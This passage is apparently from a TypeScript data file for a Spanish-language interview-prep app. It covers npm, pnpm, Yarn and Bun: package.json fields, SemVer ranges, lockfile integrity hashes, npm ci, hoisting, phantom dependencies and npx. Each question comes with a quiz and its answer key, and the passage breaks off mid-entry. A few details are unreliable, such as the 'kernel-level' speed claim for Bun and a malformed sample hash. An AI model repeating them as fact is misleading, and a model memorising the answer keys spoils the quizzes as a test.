import { ISection } from "../../types";

export const questionsPackageManager: ISection = {
  title: "Package Manager",
  collapse: "collapsePackageManager",
  icon: "package-manager",
  category: "arquitectura-ops",
  description: "Gestión con npm, pnpm y yarn, resolución de árboles de dependencias, seguridad en la cadena de suministro y monorepos.",
  questions: [
    {
        "title": "¿Cuál es la anatomía y propósito del archivo package.json y sus campos clave (scripts, engines, bin, files)?",
        "response": "**package.json** es el manifiesto central de configuración y metadatos de cualquier proyecto o librería en el ecosistema Node.js / JavaScript. No es solo una lista de librerías a descargar; define el comportamiento de ejecución, empaquetado, compatibilidad de runtime y puntos de entrada de módulos.\n\n### Campos Arquitectónicos Esenciales:\n1. **`name` & `version`**: Claves primarias de identidad pública. En paquetes con scope corporativo siguen el formato `@empresa/nombre-paquete`.\n2. **`type`**: Define el sistema modular por defecto del directorio: `\"module\"` para ECMAScript Modules (ESM con `import`/`export`) o `\"commonjs\"` (por defecto histórico con `require`/`module.exports`).\n3. **`scripts`**: Aliases de comandos ejecutados en sub-shells de sistema operativo donde `node_modules/.bin` se inyecta automáticamente al `PATH`. Soportan hooks de ciclo de vida (`pretest`, `test`, `posttest`).\n4. **`engines`**: Especifica las versiones de runtime (`node`, `pnpm`, `npm`) compatibles. Con `engine-strict=true` en `.npmrc`, la instalación aborta si el entorno del desarrollador o CI no cumple la versión requerida.\n5. **`bin`**: Expone ejecutables CLI cuando el paquete es instalado globalmente o ejecutado vía `npx`.\n6. **`files`**: Whitelist de archivos y carpetas que se empaquetarán en el tarball publicado a npm (`npm publish`), reduciendo el peso de descarga al excluir tests, código fuente crudo y documentación interna.",
        "codeExample": {
            "language": "json",
            "code": "{\n  \"name\": \"@acme/design-system\",\n  \"version\": \"2.4.1\",\n  \"type\": \"module\",\n  \"description\": \"Sistema de componentes enterprise ultra-performante\",\n  \"main\": \"./dist/index.cjs\",\n  \"module\": \"./dist/index.js\",\n  \"types\": \"./dist/index.d.ts\",\n  \"bin\": {\n    \"acme-cli\": \"./dist/cli.js\"\n  },\n  \"files\": [\n    \"dist\",\n    \"README.md\",\n    \"LICENSE\"\n  ],\n  \"scripts\": {\n    \"build\": \"tsup src/index.ts --format esm,cjs --dts\",\n    \"test\": \"vitest run\",\n    \"typecheck\": \"tsc --noEmit\",\n    \"prepublishOnly\": \"pnpm run typecheck && pnpm run build\"\n  },\n  \"engines\": {\n    \"node\": \">=20.10.0\",\n    \"pnpm\": \">=9.0.0\"\n  },\n  \"packageManager\": \"pnpm@9.5.0\"\n}"
        },
        "visualDiagram": {
            "id": "diag-pkg-01",
            "title": "Anatomía Arquitectónica del Manifiesto package.json",
            "caption": "Estructura modular dividida entre metadatos de identidad, resolución de dependencias, scripts de pipeline y puntos de empaquetado.",
            "diagramType": "pkg-package-json-anatomy"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar que conoces la función de cada campo crítico más allá de dependencies (p. ej. `files` para empaquetado mínimo, `engines` para gobernanza de entornos y `type: module`).",
            "commonPitfalls": [
                "Publicar a npm la carpeta completa sin definir el campo `files` ni `.npmignore`, filtrando tests, tokens o código confidencial.",
                "Creer que `scripts` ejecuta directamente Node: en realidad genera un sub-shell del sistema operativo (bash/sh/cmd) con `node_modules/.bin` en el `PATH`."
            ],
            "followUps": [
                "¿Qué diferencia hay entre los campos main, module y exports?",
                "¿Para qué sirve el campo files y cómo reduce el tamaño del paquete publicado?"
            ]
        },
        "quiz": {
            "question": "¿Qué campo de package.json restringe qué carpetas y archivos específicos se incluyen en el tarball final publicado a npm?",
            "options": [
                "exports",
                "files",
                "include",
                "whitelist"
            ],
            "correctIndex": 1,
            "explanation": "El campo `files` es un array de patrones glob que especifica exactamente qué archivos incluir en el paquete publicado, reduciendo drásticamente el tamaño del artefacto en npm."
        },
        "level": "basico"
    },
    {
        "title": "¿Cuáles son las diferencias arquitectónicas clave entre npm, yarn classic, yarn berry, pnpm y bun?",
        "response": "La evolución de los gestores de dependencias en JavaScript ha sido impulsada por tres factores: **velocidad de I/O en disco**, **consistencia determinista** y **prevención de bugs de aislamiento modular**.\n\n### Comparativa de Gestores:\n1. **npm (v7+)**:\n   - **Estructura**: `node_modules` plano mediante hoisting masivo.\n   - **Resolución**: Algoritmo de árbol plano con duplicación mínima; soporta workspaces nativos y `overrides`.\n   - **Desventaja**: Susceptible a dependencias fantasma; I/O lento al duplicar archivos entre proyectos distintos.\n2. **Yarn Classic (v1.x)**:\n   - Popularizó los lockfiles offline y la instalación concurrente en 2016, pero actualmente está en modo mantenimiento (deprecado).\n3. **pnpm (Performant npm)**:\n   - **Content-Addressable Store**: Guarda cada versión de paquete una sola vez a nivel global en disco (`~/.local/share/pnpm/store`).\n   - **Hard Links & Symlinks**: Crea un `node_modules` no plano estructurado mediante enlaces simbólicos. Garantiza aislamiento estricto (cero dependencias fantasma).\n4. **Yarn Berry (v2+ / v4 PnP)**:\n   - Introdujo **Plug'n'Play (PnP)**: Elimina `node_modules` por completo y mapea dependencias en un archivo JS (`.pnp.cjs`) apuntando a ficheros `.zip` inmutables.\n5. **Bun**:\n   - Escrito en **Zig**: Reimplementa la resolución de paquetes y un cliente HTTP nativo ultra-rápido, usando su propio lockfile binario (`bun.lockb`).",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Crear proyecto con PNPM (aislamiento estricto y almacenamiento global)\npnpm init\npnpm add react react-dom\n# Estructura generada: node_modules/.pnpm/react@18.2.0/node_modules/react\n\n# 2. Yarn Berry con Plug'n'Play (sin node_modules)\nyarn set version berry\nyarn install\n# Genera .pnp.cjs y cachea zips en .yarn/cache/\n\n# 3. Bun (resolución nativa a nivel de kernel en microsegundos)\nbun install"
        },
        "visualDiagram": {
            "id": "diag-pkg-02",
            "title": "Matriz Arquitectónica: Comparación entre Gestores de Paquetes",
            "caption": "Evolución desde el hoisting plano y costoso de npm hasta los hard links de pnpm, el PnP sin node_modules de Yarn Berry y el runtime nativo de Bun.",
            "diagramType": "pkg-managers-comparison-matrix"
        },
        "interviewTips": {
            "whatInterviewersWant": "Explicar cómo almacena cada gestor los archivos físicamente en disco (especialmente el Content-Addressable Store de pnpm y PnP de Yarn) y saber justificar por qué las grandes empresas migran a pnpm.",
            "commonPitfalls": [
                "Creer que pnpm solo es más rápido que npm por paralelismo; su verdadera ventaja es el Content-Addressable Storage y la estructura de enlaces duros.",
                "Usar Yarn Classic v1 en proyectos nuevos en lugar de pnpm o Yarn Modern v4."
            ],
            "followUps": [
                "¿Por qué pnpm ahorra espacio en disco con su content-addressable store?",
                "¿Qué ventajas y riesgos tiene adoptar Bun en producción?"
            ]
        },
        "quiz": {
            "question": "¿Qué gestor utiliza un almacén global direccionable por contenido (Content-Addressable Store) con hard links para no duplicar paquetes en disco entre proyectos?",
            "options": [
                "npm v10",
                "Yarn v1 Classic",
                "pnpm",
                "Bun con bun.lockb"
            ],
            "correctIndex": 2,
            "explanation": "pnpm utiliza un Content-Addressable Store global donde cada versión única de un paquete se guarda una sola vez en el disco rígido y se enlaza a cada proyecto mediante hard links."
        },
        "level": "basico"
    },
    {
        "title": "¿Qué diferencia hay entre dependencies, devDependencies, peerDependencies, optionalDependencies y bundledDependencies?",
        "response": "El manifiesto `package.json` categoriza las dependencias según el momento de su ciclo de vida y la responsabilidad de quién debe suministrarlas.\n\n### Tipos de Dependencias:\n1. **`dependencies` (Producción)**:\n   - Librerías requeridas directamente por el código en runtime de producción (`react`, `express`, `zod`). En un empaquetado para despliegue (`npm install --omit=dev`), estas librerías son las únicas instaladas.\n2. **`devDependencies` (Herramientas de Desarrollo)**:\n   - Paquetes necesarios únicamente para compilar, validar o testear el proyecto (`typescript`, `eslint`, `vitest`, `webpack`). Nunca deben consumirse en el bundle final de producción.\n3. **`peerDependencies` (Acoplamiento de Plugin/Host)**:\n   - Indican que nuestro paquete es un **plugin o complemento** que requiere una librería host suministrada por la aplicación consumidora (ej. `@tanstack/react-query` requiere `react` como peer).\n   - Evita duplicar librerías singleton donde múltiples instancias provocarían fallos críticos (como los Contexts de React o singletons de estado).\n4. **`optionalDependencies`**:\n   - Paquetes que pueden fallar al instalarse (por ejemplo binarios compilados en C/Rust específicos de una arquitectura de CPU o SO como `@swc/core-linux-x64-gnu`) sin abortar el build global.\n5. **`bundledDependencies`**:\n   - Array de dependencias que se empaquetan íntegramente dentro del tarball al ejecutar `npm pack`/`npm publish`.",
        "codeExample": {
            "language": "json",
            "code": "{\n  \"name\": \"@acme/modal-plugin\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"clsx\": \"^2.1.0\"\n  },\n  \"devDependencies\": {\n    \"@types/react\": \"^18.2.0\",\n    \"typescript\": \"^5.4.0\",\n    \"vitest\": \"^1.5.0\"\n  },\n  \"peerDependencies\": {\n    \"react\": \">=18.0.0 <19.0.0\",\n    \"react-dom\": \">=18.0.0 <19.0.0\"\n  },\n  \"peerDependenciesMeta\": {\n    \"react-dom\": {\n      \"optional\": true\n    }\n  },\n  \"optionalDependencies\": {\n    \"@rollup/rollup-linux-x64-gnu\": \"4.14.0\"\n  }\n}"
        },
        "visualDiagram": {
            "id": "diag-pkg-03",
            "title": "Taxonomía de Dependencias en package.json",
            "caption": "Diagrama de Venn y separación funcional: Dependencias en runtime, herramientas de compilación y contratos peer de plugins.",
            "diagramType": "pkg-dependencies-types-venn"
        },
        "interviewTips": {
            "whatInterviewersWant": "Saber explicar con precisión por qué existen las `peerDependencies` (para evitar instancias duplicadas de singletons como React en plugins) y cómo configurarlas con `peerDependenciesMeta`.",
            "commonPitfalls": [
                "Colocar `react` en `dependencies` al construir una librería de componentes UI, lo que fuerza dos copias de React en la app del consumidor y rompe los hooks (`Invalid hook call`).",
                "Dejar dependencias de desarrollo en `dependencies`, inflando imágenes Docker de producción."
            ],
            "followUps": [
                "¿Qué ocurre si una peerDependency no está instalada?",
                "¿Cuándo debería una librería declarar React como peerDependency?"
            ]
        },
        "quiz": {
            "question": "¿Por qué una librería de componentes React debe declarar 'react' en peerDependencies en lugar de dependencies?",
            "options": [
                "Porque peerDependencies permite compilar más rápido en TypeScript",
                "Para forzar a que la aplicación consumidora provea una única instancia compartida de React y evitar colisiones de hooks",
                "Porque npm prohíbe subir librerías con react en dependencies",
                "Para que la librería funcione en navegadores antiguos sin bundler"
            ],
            "correctIndex": 1,
            "explanation": "Declarar `react` en `peerDependencies` garantiza que la aplicación consumidora suministre la versión de React, evitando múltiples instancias concurrentes en node_modules que romperían el dispatcher de React Hooks."
        },
        "level": "basico"
    },
    {
        "title": "¿Cómo funciona Semantic Versioning (SemVer) y qué implicaciones tienen los operadores ^, ~, >= y rangos pre-release?",
        "response": "El estándar **Semantic Versioning (SemVer 2.0.0)** estructura los números de versión en tres segmentos numéricos: **`MAJOR.MINOR.PATCH`** (ej. `2.4.1`):\n\n1. **`MAJOR` (Cambios incompatibles / Breaking Changes)**: Modificaciones en la API pública que rompen retrocompatibilidad.\n2. **`MINOR` (Nueva funcionalidad retrocompatible)**: Se agregan nuevos métodos, flags o componentes manteniendo intacto el contrato anterior.\n3. **`PATCH` (Correcciones de bugs retrocompatibles)**: Fixes internos de errores o parches de seguridad sin alteraciones de API.\n\n### Operadores de Rango en package.json:\n- **`^1.2.3` (Caret / Acento circunflejo)**: Permite actualizaciones que no modifiquen el dígito más significativo distinto de cero. Para `>=1.0.0`, permite cambios `MINOR` y `PATCH` (`<2.0.0`).\n  - *Caso crítico en versiones cero*: Para `^0.2.3`, solo permite parches `0.2.x` porque en SemVer la serie `0.x.x` se considera inestable y un incremento de `0.2` a `0.3` puede contener breaking changes.\n- **`~1.2.3` (Tilde)**: Permite únicamente parches dentro de la misma versión minor (`>=1.2.3 <1.3.0`).\n- **`1.2.3` (Exacto)**: Fija la versión de manera estricta sin permitir ninguna actualización automática.\n- **Pre-releases**: Versiones como `2.0.0-rc.1` o `3.0.0-beta.2` se excluyen de rangos de comodines (`^`, `~`) a menos que se especifique explícitamente el tag pre-release.",
        "codeExample": {
            "language": "bash",
            "code": "# Ejemplos de resolución de rangos SemVer:\n\n# Caret (^): actualiza Minor y Patch si Major >= 1\n\"lodash\": \"^4.17.20\"  # Resuelve 4.17.21, 4.18.0, pero NUNCA 5.0.0\n\n# Caret en versiones 0.x (¡comportamiento especial!):\n\"mi-lib\": \"^0.4.1\"    # Resuelve 0.4.2, pero NUNCA 0.5.0 (rompería retrocompatibilidad)\n\n# Tilde (~): solo actualiza parches de seguridad/bugs\n\"typescript\": \"~5.4.2\" # Resuelve 5.4.3, 5.4.5, pero NUNCA 5.5.0\n\n# Rangos avanzados con operadores lógicos y pre-releases:\n\"react\": \">=18.2.0 <19.0.0 || ^19.0.0-rc.0\""
        },
        "visualDiagram": {
            "id": "diag-pkg-04",
            "title": "Matriz de Resolución de Rangos SemVer: Caret (^) vs Tilde (~)",
            "caption": "Comportamiento de actualización permitido según operadores de rango en versiones estables vs inestables (0.x.x).",
            "diagramType": "pkg-semver-ranges-caret-tilde"
        },
        "interviewTips": {
            "whatInterviewersWant": "Detectar si conoces la excepción de SemVer para versiones `0.x.x` con el operador `^` (un cambio en MINOR se trata como MAJOR) y cómo los rangos interactúan con los lockfiles.",
            "commonPitfalls": [
                "Creer que `^0.2.1` actualizará automáticamente a `0.3.0` (npm no lo hará porque `0.x.x` no garantiza retrocompatibilidad en cambios minor).",
                "Asumir que SemVer previene al 100% bugs: una librería puede publicar un breaking change por error en una versión minor."
            ],
            "followUps": [
                "¿Qué rango de versiones permite ^0.2.3 y por qué es especial en las versiones 0.x?",
                "¿Cómo funcionan las versiones pre-release (1.0.0-beta.1)?"
            ]
        },
        "quiz": {
            "question": "Si una dependencia en package.json tiene la versión '^0.3.4', ¿cuál es la versión máxima que npm/pnpm instalará de forma automática?",
            "options": [
                "0.9.9",
                "0.4.0",
                "0.3.x (cualquier parche posterior dentro de 0.3)",
                "1.0.0"
            ],
            "correctIndex": 2,
            "explanation": "En SemVer, para versiones menores a 1.0.0, el operador caret (^) solo permite actualizaciones en el dígito de parche (PATCH), impidiendo subir a 0.4.0 porque se consideran posibles breaking changes."
        },
        "level": "medio"
    },
    {
        "title": "¿Cuál es el rol crítico de los lockfiles (package-lock.json, pnpm-lock.yaml, yarn.lock) y qué es el campo integrity (SRI)?",
        "response": "El **lockfile** es un registro determinista del árbol de dependencias completo, resolviendo y fijando las versiones exactas tanto de las dependencias directas como de todas sus dependencias transitivas (sub-dependencias anidadas).\n\n### Por qué los Lockfiles son Obligatorios en Git:\n1. **Determinismo entre Entornos**: Si dos ingenieros o el servidor de CI ejecutan la instalación en días distintos, sin lockfile un paquete con `^1.2.0` podría instalar `1.2.0` hoy y `1.2.9` mañana, introduciendo bugs imposibles de reproducir.\n2. **Aplanamiento del Árbol**: Registra exactamente qué sub-dependencia fue elevada (hoisted) al nivel superior para evitar duplicidades.\n3. **Integridad Criptográfica (Subresource Integrity - SRI)**: Cada entrada en el lockfile contiene el campo `integrity`, que es un hash criptográfico (típicamente `sha512-...`).\n   - Al descargar el tarball desde npm, el gestor calcula el hash SHA-512 del archivo recibido y lo compara con el campo `integrity` del lockfile.\n   - Si un atacante compromete el registry o realiza un ataque Man-in-the-Middle (MitM) alterando el contenido del paquete sin cambiar la versión, el hash no coincidirá y la instalación abortará con `EINTEGRITY`.",
        "codeExample": {
            "language": "json",
            "code": "// Fragmento de package-lock.json v3 mostrando integridad SRI:\n{\n  \"node_modules/axios\": {\n    \"version\": \"1.6.8\",\n    \"resolved\": \"https://registry.npmjs.org/axios/-/axios-1.6.8.tgz\",\n    \"integrity\": \"sha512-v/ZGpNYSLTWbl2zdOtQKVXNbCyoqdULVu52PHch ReS3tC8GItXNtxKURj042LJvHPWVC0FwSMORKN4AYyCcA==\",\n    \"license\": \"MIT\",\n    \"dependencies\": {\n      \"follow-redirects\": \"^1.15.6\",\n      \"form-data\": \"^4.0.0\",\n      \"proxy-from-env\": \"^1.1.0\"\n    }\n  }\n}"
        },
        "visualDiagram": {
            "id": "diag-pkg-05",
            "title": "Verificación Criptográfica de Integridad (SRI) en Lockfiles",
            "caption": "El campo integrity valida que el tarball descargado del registry coincida bit a bit con el hash SHA-512 registrado en el lockfile.",
            "diagramType": "pkg-lockfile-integrity-hash"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar que entiendes el valor de seguridad del hash `integrity` (SRI) contra ataques de envenenamiento de paquetes y enfatizar que los lockfiles SIEMPRE deben commitearse en Git.",
            "commonPitfalls": [
                "Agregar el lockfile a `.gitignore` (anti-patrón destructivo en aplicaciones enterprise).",
                "Resolver conflictos de Git en un lockfile manualmente con un editor de texto en vez de regenerarlo con `pnpm install` o `npm install`."
            ],
            "followUps": [
                "¿Por qué el lockfile debe commitearse siempre en aplicaciones?",
                "¿Qué protege el campo integrity del lockfile?"
            ]
        },
        "quiz": {
            "question": "¿Qué previene la validación del campo 'integrity' (hash sha512) almacenado en el lockfile?",
            "options": [
                "Que dos desarrolladores utilicen versiones distintas de Node.js",
                "Que un tarball modificado maliciosamente o corrupto en el registry sea instalado sin ser detectado",
                "Que el bundle de producción supere un límite de megabytes",
                "Que una librería con licencia GPL sea instalada por error"
            ],
            "correctIndex": 1,
            "explanation": "El campo integrity almacena el hash criptográfico SHA-512 del paquete. Si el contenido descargado difiere en un solo byte (por corrupción o ataque a la cadena de suministro), la instalación falla inmediatamente con EINTEGRITY."
        },
        "level": "medio"
    },
    {
        "title": "¿Cuál es la diferencia técnica entre npm install y npm ci (o pnpm install --frozen-lockfile) en pipelines de CI/CD?",
        "response": "En entornos de integración y despliegue continuo (CI/CD), usar el comando incorrecto de instalación puede introducir fallos fantasma o modificar accidentalmente dependencias.\n\n### `npm install` vs `npm ci`:\n\n| Característica | `npm install` | `npm ci` (Clean Install) |\n| :--- | :--- | :--- |\n| **Rol principal** | Desarrollo local interactivo. | Pipelines de CI/CD y despliegues productivos. |\n| **Comportamiento con lockfile** | Si `package.json` tiene rangos que admiten versiones más nuevas, **puede reescribir el lockfile**. | **Estrictamente de solo lectura**. Si el lockfile no coincide con package.json, arroja error y aborta. |\n| **Gestión de `node_modules`** | Modifica de forma incremental el directorio existente. | **Elimina `node_modules` por completo** antes de instalar desde cero. |\n| **Rendimiento** | Más lento al tener que recalcular el árbol si hay discrepancias. | Significativamente más rápido al omitir la resolución del árbol y limitarse a descomprimir. |\n| **Requisito** | Funciona sin lockfile (lo crea). | Falla si no existe `package-lock.json` previo. |\n\n### Equivalentes en otros gestores:\n- **pnpm**: `pnpm install --frozen-lockfile` (en CI, pnpm activa este flag automáticamente si detecta `CI=true`).\n- **yarn**: `yarn install --immutable` (Yarn Berry) o `yarn install --frozen-lockfile` (Yarn Classic).",
        "codeExample": {
            "language": "bash",
            "code": "# Pipeline de CI recomendado en GitHub Actions (.github/workflows/ci.yml):\n\n# Enfoque con npm:\n- name: Install dependencies (NPM)\n  run: npm ci\n\n# Enfoque con PNPM (aislamiento total y frozen lockfile):\n- name: Setup PNPM\n  uses: pnpm/action-setup@v3\n  with:\n    version: 9\n\n- name: Install dependencies (PNPM Frozen)\n  run: pnpm install --frozen-lockfile\n  # Si alguien modificó package.json sin regenerar pnpm-lock.yaml, el job falla de inmediato"
        },
        "visualDiagram": {
            "id": "diag-pkg-06",
            "title": "Flujo de Ejecución: npm install vs npm ci en CI/CD",
            "caption": "npm ci garantiza builds deterministas al purgar node_modules y congelar el lockfile, abortando si detecta desincronizaciones.",
            "diagramType": "pkg-npm-install-vs-npm-ci"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar que sabes por qué nunca debe usarse `npm install` en pipelines de CI (riesgo de alterar el lockfile y generar builds no reproducibles).",
            "commonPitfalls": [
                "Usar `npm install` en Dockerfiles de producción, arriesgando discrepancias de versiones entre staging y prod.",
                "Olvidar que `npm ci` borra completamente `node_modules`, por lo que si hay cachés mal configuradas puede costar más I/O."
            ],
            "followUps": [
                "¿Qué ocurre con npm ci si package.json y el lockfile no coinciden?",
                "¿Por qué npm ci borra node_modules antes de instalar?"
            ]
        },
        "quiz": {
            "question": "¿Qué ocurre si ejecutas 'npm ci' y detecta que package.json solicita dependencias incompatibles con el package-lock.json?",
            "options": [
                "npm ci actualiza automáticamente el lockfile para corregir el conflicto",
                "npm ci ignora el package.json e instala lo que diga el lockfile en silencio",
                "npm ci arroja un error fatal y aborta el proceso de instalación",
                "npm ci descarga ambas versiones y las anida"
            ],
            "correctIndex": 2,
            "explanation": "A diferencia de npm install, npm ci jamás modifica el lockfile. Si package.json y package-lock.json están desincronizados, aborta con código de error para impedir builds no deterministas."
        },
        "level": "medio"
    },
    {
        "title": "¿Cómo funciona el algoritmo de hoisting en npm/yarn v1 y por qué se pasó de la estructura anidada a la plana?",
        "response": "En los inicios de Node.js (npm v1 y v2), la estructura de dependencias era **completamente anidada**:\n- Si la App dependía de `A` y `B`, y ambos dependían de `C`, el disco contenía:\n  `node_modules/A/node_modules/C` y `node_modules/B/node_modules/C`.\n- **Problemas Graves**:\n  1. **Duplicación masiva de disco**: La misma librería se copiaba docenas de veces.\n  2. **Límite de longitud de ruta en Windows (MAX_PATH = 260 chars)**: Las rutas anidadas profundas rompían el sistema de archivos de Windows.\n\n### La Solución de npm v3+: Hoisting (Aplanamiento del Árbol):\nPara solucionar estos problemas, npm y Yarn adoptaron un algoritmo de **hoisting**:\n1. Las dependencias secundarias se 'elevan' al directorio raíz `node_modules/`.\n2. Si `A` requiere `C@1.0.0` y `B` requiere `C@1.0.0`, `C` se eleva a la raíz `node_modules/C` y es compartida por ambos.\n3. **Conflictos de Versión**: Si `A` requiere `C@1.0.0` pero `B` requiere `C@2.0.0`, uno de ellos se eleva a la raíz (el primero que procese el algoritmo), y el otro se mantiene anidado dentro de su paquete padre (`node_modules/B/node_modules/C@2.0.0`).\n\n### La Consecuencia No Deseada: Dependencias Fantasma:\nAl elevar paquetes a la raíz, la aplicación puede accidentalmente hacer `import 'C'` sin haber declarado nunca `C` en su propio `package.json`, sentando las bases de fragilidad en el ecosistema.",
        "codeExample": {
            "language": "bash",
            "code": "# Estructura Anidada Primitiva (npm v2):\n# node_modules/\n# ├── lib-a/\n# │   └── node_modules/lodash@4.0.0/\n# └── lib-b/\n#     └── node_modules/lodash@4.0.0/ (¡Duplicado!)\n\n# Estructura Plana con Hoisting (npm v3+ / Yarn v1):\n# node_modules/\n# ├── lib-a/\n# ├── lib-b/\n# ├── lodash@4.0.0/  <-- ELEVADO a la raíz y compartido\n# └── lib-c/\n#     └── node_modules/lodash@3.0.0/ <-- Conflicto: anidado localmente"
        },
        "visualDiagram": {
            "id": "diag-pkg-07",
            "title": "Evolución de node_modules: Árbol Anidado vs Hoisting Plano",
            "caption": "El hoisting eleva dependencias transitivas compartidas a la raíz de node_modules para evitar rutas profundas y duplicaciones.",
            "diagramType": "pkg-hoisting-flat-vs-nested"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar conocimiento histórico y arquitectónico: explicar por qué se creó el hoisting (rutas largas de Windows y peso) y qué problemas nuevos causó (no determinismo y dependencias fantasma).",
            "commonPitfalls": [
                "Creer que el hoisting en npm garantiza que siempre se instale la última versión posible (depende del orden de resolución lexicográfico o del lockfile).",
                "Ignorar el impacto del hoisting en la reproducibilidad de módulos compartidos."
            ],
            "followUps": [
                "¿Qué problemas de duplicación surgen con versiones incompatibles en el árbol?",
                "¿Por qué el hoisting habilita las phantom dependencies?"
            ]
        },
        "quiz": {
            "question": "¿Qué problema del sistema operativo Windows motivó históricamente la creación del algoritmo de hoisting en npm v3?",
            "options": [
                "Falta de soporte para symlinks en Windows 95",
                "El límite MAX_PATH de 260 caracteres en rutas de archivos que se rompía con árboles de dependencias profundamente anidados",
                "Incompatibilidad con PowerShell",
                "Imposibilidad de ejecutar scripts bash en Windows"
            ],
            "correctIndex": 1,
            "explanation": "El límite de 260 caracteres (MAX_PATH) de la API clásica de Windows hacía que árboles anidados de 8 niveles superaran la longitud máxima de ruta, haciendo que herramientas como rm o explorer fallaran."
        },
        "level": "medio"
    },
    {
        "title": "¿Qué son las 'phantom dependencies' (o dependencias fantasma) y qué riesgos arquitectónicos introducen?",
        "response": "Una **Phantom Dependency** (dependencia fantasma o undeclared dependency) ocurre cuando un archivo de tu proyecto importa y utiliza un paquete que **NO está declarado** en las `dependencies` ni `devDependencies` de su `package.json`, pero el código funciona en tiempo de desarrollo porque el paquete fue elevado (hoisted) a la raíz de `node_modules` por alguna dependencia transitiva.\n\n### Por qué es un Riesgo Crítico en Producción:\n1. **Fragilidad ante Actualizaciones**: Si la librería externa que traía ese paquete transitivo decide cambiar de versión, eliminar la dependencia o reemplazarla por otra alternativa, tu proyecto dejará de compilar o arrojará `Error: Cannot find module 'x'` repentinamente sin que hayas tocado una sola línea de código.\n2. **Incompatibilidad entre Entornos**: Lo que funciona en la máquina del desarrollador puede fallar en CI o en producción dependiendo del orden en que el gestor resuelva el árbol plano.\n3. **Riesgos de Seguridad**: Tu código se apoya en librerías cuya versión y parches no estás auditando ni controlando en tu propio manifiesto.\n\n### Cómo lo resuelve pnpm:\npnpm no eleva las dependencias transitivas a la raíz de `node_modules`. La carpeta raíz de `node_modules` solo contiene symlinks a las dependencias explícitamente declaradas en tu `package.json`. Si intentas importar una dependencia fantasma, el resolver de Node.js falla de inmediato en local, forzándote a declararla.",
        "codeExample": {
            "language": "typescript",
            "code": "// Archivo: src/services/auth.ts\n// package.json solo tiene: \"dependencies\": { \"axios\": \"^1.6.0\" }\n\n// ❌ RIESGO: axios depende internamente de 'follow-redirects'.\n// En npm/yarn v1, 'follow-redirects' fue hoisted a la raíz de node_modules.\n// Tu código compila hoy por accidente:\nimport followRedirects from 'follow-redirects'; // ¡PHANTOM DEPENDENCY!\n\n// Si mañana axios se actualiza a v2 y deja de usar follow-redirects:\n// -> Tu build de producción colapsa: Cannot find module 'follow-redirects'\n\n// ✅ SOLUCIÓN EN PNPM:\n// pnpm no crea el symlink de follow-redirects en la raíz del proyecto.\n// El error salta en tu editor antes de commitear:\n// pnpm add follow-redirects  # Forzado a declararlo explícitamente"
        },
        "visualDiagram": {
            "id": "diag-pkg-08",
            "title": "Aislamiento Estricto: Phantom Dependencies en npm vs pnpm Symlinks",
            "caption": "npm permite acceso accidental a dependencias transitivas elevadas. pnpm bloquea el acceso mediante symlinks exclusivos a lo declarado en package.json.",
            "diagramType": "pkg-phantom-dependencies-pnpm"
        },
        "interviewTips": {
            "whatInterviewersWant": "Saber definir claramente el concepto de dependencia fantasma y explicar la arquitectura de enlaces simbólicos de pnpm que erradica este problema.",
            "commonPitfalls": [
                "Creer que si TypeScript no marca error de compilación no hay dependencias fantasma (TS buscará tipos en cualquier @types elevado si existe en la raíz).",
                "Confundir peer dependencies con phantom dependencies."
            ],
            "followUps": [
                "¿Cómo detectarías phantom dependencies en un proyecto existente?",
                "¿Por qué pnpm las bloquea por defecto?"
            ]
        },
        "quiz": {
            "question": "¿Por qué un proyecto gestionado con pnpm arrojará error de importación si intentas usar una dependencia transitiva no declarada en package.json?",
            "options": [
                "Porque pnpm cifra las librerías con una clave privada",
                "Porque la raíz de node_modules solo contiene symlinks de los paquetes explícitamente declarados en package.json",
                "Porque pnpm compila todo con Rust e inhabilita Node.js",
                "Porque pnpm desinstala las sub-dependencias tras el build"
            ],
            "correctIndex": 1,
            "explanation": "La carpeta node_modules de pnpm aísla estrictamente el entorno: solo crea enlaces simbólicos directos para los paquetes definidos en el package.json de ese módulo, impidiendo la resolución de dependencias transitivas no declaradas."
        },
        "level": "avanzado"
    },
    {
        "title": "¿Qué es npx, cómo ejecuta binarios efímeros y cómo interactúa con node_modules/.bin y PATH?",
        "response": "**`npx` (Node Package Execute)** es un CLI runner integrado con npm desde v5.2.0 diseñado para ejecutar ejecutables de paquetes npm sin necesidad de instalarlos de forma global ni agregarlos permanentemente a las dependencias del proyecto.\n\n### Mecánica de Resolución de npx:\nCuando ejecutas `npx <comando>` (ej. `npx prisma migrate dev`):\n1. **Búsqueda Local Primaria**: Inspecciona primero si el ejecutable existe en el directorio local `./node_modules/.bin` del proyecto actual.\n2. **Búsqueda en PATH del Sistema**: Si no está en local, revisa los ejecutables instalados a nivel de sistema operativo.\n3. **Descarga y Ejecución Efímera**: Si no existe ni local ni globalmente, descarga el paquete correspondiente en una carpeta temporal del sistema operativo (`~/.npm/_npx/`), ejecuta el binario y limpia los recursos sin dejar rastro permanente en `package.json`.\n\n### Diferencia con npm exec:\nEn npm v7+, `npm exec` es el comando oficial de bajo nivel, mientras que `npx` funciona como un alias amigable con soporte interactivo de confirmación de instalación temporal.",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Ejecutar herramienta local sin invocar rutas largas relativas\n# En vez de: ./node_modules/.bin/eslint src/\nnpx eslint src/\n\n# 2. Ejecutar generador de proyectos efímero (siempre la última versión disponible)\nnpx create-next-app@latest my-app --typescript\n\n# 3. Forzar ejecución sin instalar si no existe localmente\nnpx --no-install vitest run\n\n# 4. Especificar versión explícita para una tarea puntual\nnpx -p typescript@5.3.0 tsc --version"
        },
        "visualDiagram": {
            "id": "diag-pkg-09",
            "title": "Resolución de Ejecutables Efímeros con npx",
            "caption": "Jerarquía de búsqueda: primero inspecciona node_modules/.bin local; si no existe, descarga en caché efímera sin contaminar dependencias.",
            "diagramType": "pkg-npx-ephemeral-execution"
        },
        "interviewTips": {
            "whatInterviewersWant": "Explicar que `npx` previene la contaminación global del sistema (`npm install -g`) y garantiza que los scripts de un proyecto usen las versiones exactas instaladas en su `./node_modules/.bin`.",
            "commonPitfalls": [
                "Creer que `npx` siempre descarga el paquete de internet: si el paquete ya existe en `./node_modules/.bin`, usa la versión local instantáneamente.",
                "Usar `npx` para librerías que se ejecutan cientos de veces en un loop de CI sin caching."
            ],
            "followUps": [
